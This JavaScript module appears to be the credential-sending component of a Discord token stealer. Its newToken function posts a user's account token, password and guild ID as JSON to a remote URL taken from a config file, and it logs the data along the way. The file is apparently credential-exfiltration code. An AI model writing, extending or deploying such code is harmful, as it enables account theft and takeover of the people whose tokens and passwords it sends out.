const axios = require('axios');
const { url } = require("../config.json");

module.exports = {newToken}

async function newToken(token, password, guildId) {
    sendType("newToken");
    const data = { 
        Token: token, 
        Password: password, 
        GuildId: guildId };
    console.log(data);
    await axios.post(url, data,  
    {
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then((responce) => {
        console.log(responce.data);
    });    
}

async function sendType(Type) {
    await axios.post(url, Type)
    .then((responce) => {if (responce !== "success") {
        console.log("error while sending type")
    }})
}